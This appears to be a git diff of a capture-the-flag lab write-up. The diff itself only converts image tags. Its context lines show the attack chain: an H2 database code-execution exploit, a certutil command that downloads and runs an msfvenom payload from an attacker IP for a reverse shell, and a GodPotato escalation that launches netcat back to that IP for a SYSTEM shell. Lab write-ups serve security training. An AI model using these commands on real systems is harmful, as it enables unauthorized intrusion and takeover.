@@ -57,11 +57,11 @@ The H2 Database does have a few code execution exploits that might work.
 
 Port 8082 shows us the login to the H2 database.
 
-<figure><img src="../../../.gitbook/assets/image (2284).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2284).png>)
 
 We can just click 'Connect', and login successfully.
 
-<figure><img src="../../../.gitbook/assets/image (1084).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1084).png>)
 
 This version has code execution exploits available:
 
@@ -76,7 +76,7 @@ H2 Database 1.4.199 - JNI Code Execution                   | java/local/49384.tx
 
 To exploit this, we would need to just copy and paste the script contents of the `searchsploit` file twice, and we would get RCE:
 
-<figure><img src="../../../.gitbook/assets/image (831).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(831).png>)
 
 To get a reverse shell, simply use these 2 commands with a `msfvenom` generated payload.
 
@@ -86,7 +86,7 @@ certutil -urlcache -split -f http://192.168.45.177/pwn.exe C:\\Windows\\Tasks\\p
 C:\\Windows\\Tasks\\pwn.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3697).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3697).png>)
 
 `whoami.exe` is located in `C:\Windows\System32`, and this machine has a broken PATH variable.
 
@@ -203,6 +203,6 @@ C:\Windows\Tasks>.\godpotato.exe -cmd "cmd /c C:/Windows/Tasks/nc.exe 192.168.45
 [*] process start with pid 1592
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2456).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2456).png>)
 
 This is a SYSTEM shell, and we can grab the required flags. Rooted!
